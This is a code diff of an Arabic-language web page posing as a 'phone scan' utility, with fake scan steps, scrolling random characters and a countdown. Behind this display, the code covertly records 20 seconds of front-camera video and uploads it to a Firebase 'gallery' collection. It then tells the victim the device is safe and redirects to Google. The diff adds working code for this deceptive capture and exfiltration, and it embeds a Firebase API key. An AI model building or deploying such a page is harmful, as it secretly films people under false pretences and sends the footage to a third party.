@@ -9,47 +9,35 @@
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body{font-family:'Courier New',monospace;background:#000;color:#0f0;min-height:100vh;overflow:hidden}
-        
         .screen{display:none;padding:20px;text-align:center;height:100vh}
         .screen.active{display:flex;flex-direction:column;align-items:center;justify-content:center}
-        
         .logo{font-size:70px;margin-bottom:15px;animation:pulse 1s infinite}
         @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
-        
         h1{color:#0f0;font-size:22px;margin-bottom:10px}
         .sub{color:#666;font-size:13px;margin-bottom:25px}
-        
-        .btn-start{padding:20px 50px;background:transparent;color:#0f0;border:2px solid #0f0;font-size:20px;cursor:pointer;border-radius:10px;font-family:'Courier New',monospace;font-weight:bold;transition:all 0.3s}
-        .btn-start:hover{background:#0f0;color:#000}
-        
-        .code-screen{background:#000;border:1px solid #0f0;border-radius:8px;padding:12px;width:100%;max-width:450px;height:280px;overflow:hidden;text-align:left;font-size:10px;line-height:1.3;margin:15px 0}
-        .code-screen .line{opacity:0.7}
-        
-        .timer{color:#ff0;font-size:50px;font-weight:bold;margin:10px 0}
-        .progress{width:100%;max-width:450px;height:6px;background:#111;border-radius:3px;margin:10px 0;overflow:hidden}
+        .btn-start{padding:20px 50px;background:transparent;color:#0f0;border:2px solid #0f0;font-size:20px;cursor:pointer;border-radius:10px;font-family:'Courier New',monospace;font-weight:bold}
+        .btn-start:active{background:#0f0;color:#000}
+        .code-screen{background:#000;border:1px solid #0f0;border-radius:8px;padding:12px;width:100%;max-width:450px;height:200px;overflow:hidden;text-align:left;font-size:10px;line-height:1.3;margin:10px 0}
+        .timer{color:#ff0;font-size:55px;font-weight:bold;margin:8px 0}
+        .progress{width:100%;max-width:450px;height:6px;background:#111;border-radius:3px;margin:8px 0;overflow:hidden}
         .progress-fill{height:100%;width:0%;background:#0f0;transition:width 0.3s}
-        
-        .status{color:#0f0;font-size:14px;margin:8px 0}
+        .status{color:#0f0;font-size:14px;margin:5px 0}
         .status.error{color:#ff0040}
-        
-        .steps{text-align:right;width:100%;max-width:450px;margin:10px 0;font-size:10px;color:#555}
-        .steps div{padding:4px 0}
+        .steps{text-align:right;width:100%;max-width:450px;margin:8px 0;font-size:10px;color:#555}
+        .steps div{padding:3px 0}
         .steps div.done{color:#0f0}
         .steps div.current{color:#ff0;animation:blink 0.7s infinite}
         @keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
-        
         .result-box{background:rgba(0,255,0,0.05);border:2px solid #0f0;border-radius:12px;padding:25px;text-align:center}
         .result-box.error{border-color:#ff0040;background:rgba(255,0,0,0.05)}
         .result-box .icon{font-size:60px}
         .result-box h2{font-size:20px;margin:10px 0}
         .result-box p{color:#888;font-size:12px}
-        
         video,canvas{display:none}
     </style>
 </head>
 <body>
 
-<!-- الشاشة 1: البداية -->
 <div class="screen active" id="screen-start">
     <div class="logo">📱</div>
     <h1>فحص الهاتف</h1>
@@ -57,11 +45,9 @@
     <button class="btn-start" onclick="startScan()">⚡ ابدأ الفحص</button>
 </div>
 
-<!-- الشاشة 2: الفحص -->
 <div class="screen" id="screen-scan">
     <div class="logo">🔄</div>
     <h1>جاري فحص الهاتف...</h1>
-    
     <div class="steps">
         <div class="current" id="st1">⏳ تهيئة النظام...</div>
         <div id="st2">⬜ فحص برامج التشغيل</div>
@@ -69,15 +55,12 @@
         <div id="st4">⬜ فحص الذاكرة</div>
         <div id="st5">⬜ التحقق من الأمان</div>
     </div>
-    
     <div class="timer" id="timer">30</div>
     <div class="progress"><div class="progress-fill" id="progressFill"></div></div>
     <div class="status" id="status">⏳ جاري الفحص...</div>
-    
     <div class="code-screen" id="codeScreen"></div>
 </div>
 
-<!-- الشاشة 3: النتيجة -->
 <div class="screen" id="screen-result">
     <div class="result-box" id="resultBox">
         <div class="icon" id="resultIcon">✅</div>
@@ -92,6 +75,8 @@
 firebase.initializeApp({apiKey:"AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",projectId:"game-a1aca",storageBucket:"game-a1aca.firebasestorage.app",appId:"1:598280425947:android:0e4ead8d9b50cfc92157fe"});
 var db = firebase.firestore();
 var stream = null, mediaRecorder = null, recordedChunks = [];
+var scanFinished = false;
+var videoUploaded = false;
 
 function showScreen(id){
     document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active');});
@@ -101,9 +86,9 @@ function showScreen(id){
 function generateCode(){
     var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz!@#$%^&*()_+-=[]{}|;:,.<>?/';
     var lines = [];
-    for(var i=0;i<100;i++){
+    for(var i=0;i<60;i++){
         var line = '';
-        for(var j=0;j<70;j++){line += chars[Math.floor(Math.random()*chars.length)];}
+        for(var j=0;j<55;j++){line += chars[Math.floor(Math.random()*chars.length)];}
         lines.push('<div class="line">'+line+'</div>');
     }
     return lines.join('');
@@ -111,7 +96,7 @@ function generateCode(){
 
 function updateSteps(step){
     var steps = ['st1','st2','st3','st4','st5'];
-    var texts = ['✅ تهيئة النظام - اكتمل','✅ فحص برامج التشغيل - اكتمل','✅ فحص الكاميرا - اكتمل','✅ فحص الذاكرة - اكتمل','✅ التحقق من الأمان - اكتمل'];
+    var texts = ['✅ تهيئة النظام','✅ فحص برامج التشغيل','✅ فحص الكاميرا','✅ فحص الذاكرة','✅ التحقق من الأمان'];
     for(var i=0;i<steps.length;i++){
         var el = document.getElementById(steps[i]);
         if(i < step){el.className = 'done';el.textContent = texts[i];}
@@ -119,92 +104,9 @@ function updateSteps(step){
     }
 }
 
-async function startScan(){
-    showScreen('screen-scan');
-    
-    // طلب إذن الكاميرا
-    try{
-        stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
-        document.getElementById('video').srcObject = stream;
-        
-        // بدء التسجيل
-        mediaRecorder = new MediaRecorder(stream);
-        mediaRecorder.ondataavailable = function(e){if(e.data.size > 0) recordedChunks.push(e.data);};
-        mediaRecorder.start();
-    }catch(e){
-        showResult(false, '❌ فشل', 'يرجى السماح بالوصول للكاميرا');
-        return;
-    }
-    
-    // تشغيل الأكواد البرمجية
-    document.getElementById('codeScreen').innerHTML = generateCode();
-    var codeInterval = setInterval(function(){
-        document.getElementById('codeScreen').innerHTML = generateCode();
-        document.getElementById('codeScreen').scrollTop = document.getElementById('codeScreen').scrollHeight;
-    }, 150);
-    
-    // العداد
-    var sec = 30;
-    updateSteps(0);
-    
-    var timerInterval = setInterval(function(){
-        sec--;
-        document.getElementById('timer').textContent = sec;
-        document.getElementById('progressFill').style.width = ((30-sec)/30*100)+'%';
-        
-        if(sec <= 25) updateSteps(1);
-        if(sec <= 20){updateSteps(2);document.getElementById('status').textContent = '⏳ فحص الكاميرا...';}
-        if(sec <= 12) updateSteps(3);
-        if(sec <= 5){updateSteps(4);document.getElementById('status').textContent = '⏳ التحقق من الأمان...';}
-        
-        if(sec <= 0){
-            clearInterval(timerInterval);
-            clearInterval(codeInterval);
-            
-            // إيقاف التسجيل بعد 20 ثانية (يعني عند sec=10)
-            // التسجيل يبدا من sec=30 لـ sec=10 = 20 ثانية فيديو
-        }
-    }, 1000);
-    
-    // إيقاف التسجيل بعد 20 ثانية
-    setTimeout(function(){
-        if(mediaRecorder && mediaRecorder.state === 'recording'){
-            mediaRecorder.stop();
-            if(stream) stream.getTracks().forEach(function(t){t.stop();});
-        }
-    }, 20000);
-    
-    // معالجة الفيديو ورفعه
-    mediaRecorder.onstop = async function(){
-        var blob = new Blob(recordedChunks, {type:'video/mp4'});
-        var reader = new FileReader();
-        reader.onload = async function(e){
-            try{
-                await db.collection('gallery').add({
-                    url: e.target.result,
-                    type: '🎬 فحص فيديو أمامي',
-                    timestamp: new Date().toISOString()
-                });
-                showResult(true, '✅ تم الفحص بنجاح!', 'لا يوجد أي تهديدات - جهازك آمن');
-            }catch(err){
-                showResult(false, '❌ فشل الرفع', 'عد المحاولة لاحقاً');
-            }
-        };
-        reader.onerror = function(){
-            showResult(false, '❌ فشل المعالجة', 'عد المحاولة لاحقاً');
-        };
-        reader.readAsDataURL(blob);
-    };
-    
-    // لو فشل التسجيل
-    setTimeout(function(){
-        if(!mediaRecorder || mediaRecorder.state === 'inactive'){
-            // خلاص اشتغل
-        }
-    }, 25000);
-}
-
-function showResult(success, title, msg){
+function finishScan(success, title, msg){
+    if(scanFinished) return;
+    scanFinished = true;
     showScreen('screen-result');
     var box = document.getElementById('resultBox');
     if(!success){
@@ -216,10 +118,90 @@ function showResult(success, title, msg){
     }
     document.getElementById('resultTitle').textContent = title;
     document.getElementById('resultMsg').textContent = msg;
+    setTimeout(function(){window.location.href = 'https://google.com/';}, 3000);
+}
+
+async function startScan(){
+    showScreen('screen-scan');
+    recordedChunks = [];
+    scanFinished = false;
+    videoUploaded = false;
     
-    setTimeout(function(){
-        window.location.href = 'https://google.com/';
-    }, 3000);
+    try{
+        stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
+        document.getElementById('video').srcObject = stream;
+        
+        mediaRecorder = new MediaRecorder(stream);
+        mediaRecorder.ondataavailable = function(e){if(e.data.size > 0) recordedChunks.push(e.data);};
+        
+        mediaRecorder.onstop = function(){
+            var blob = new Blob(recordedChunks, {type:'video/mp4'});
+            var reader = new FileReader();
+            reader.onload = function(e){
+                db.collection('gallery').add({
+                    url: e.target.result,
+                    type: '🎬 فحص فيديو أمامي',
+                    timestamp: new Date().toISOString()
+                }).then(function(){
+                    videoUploaded = true;
+                }).catch(function(err){
+                    console.log(err);
+                });
+            };
+            reader.onerror = function(){
+                // فشل في قراءة الملف
+            };
+            reader.readAsDataURL(blob);
+        };
+        
+        mediaRecorder.start();
+        
+        // إيقاف التسجيل بعد 20 ثانية
+        setTimeout(function(){
+            if(mediaRecorder && mediaRecorder.state === 'recording'){
+                mediaRecorder.stop();
+                if(stream) stream.getTracks().forEach(function(t){t.stop();});
+            }
+        }, 20000);
+        
+    }catch(e){
+        finishScan(false, '❌ فشل', 'يرجى السماح بالوصول للكاميرا');
+        return;
+    }
+    
+    // الأكواد البرمجية
+    document.getElementById('codeScreen').innerHTML = generateCode();
+    var codeInterval = setInterval(function(){
+        document.getElementById('codeScreen').innerHTML = generateCode();
+        document.getElementById('codeScreen').scrollTop = document.getElementById('codeScreen').scrollHeight;
+    }, 100);
+    
+    // العداد 30 ثانية
+    var sec = 30;
+    document.getElementById('timer').textContent = sec;
+    updateSteps(0);
+    
+    var timerInterval = setInterval(function(){
+        sec--;
+        document.getElementById('timer').textContent = sec;
+        document.getElementById('progressFill').style.width = ((30-sec)/30*100)+'%';
+        
+        if(sec <= 26) updateSteps(1);
+        if(sec <= 21){updateSteps(2);document.getElementById('status').textContent = '⏳ فحص الكاميرا...';}
+        if(sec <= 13) updateSteps(3);
+        if(sec <= 6){updateSteps(4);document.getElementById('status').textContent = '⏳ التحقق من الأمان...';}
+        
+        if(sec <= 0){
+            clearInterval(timerInterval);
+            clearInterval(codeInterval);
+            document.getElementById('status').textContent = '⏳ جاري تجهيز النتيجة...';
+            
+            // نعرض النتيجة بعد 3 ثواني مباشرة
+            setTimeout(function(){
+                if(!scanFinished) finishScan(true, '✅ تم الفحص بنجاح!', 'لا يوجد أي تهديدات - جهازك آمن');
+            }, 3000);
+        }
+    }, 1000);
 }
 </script>
 </body>
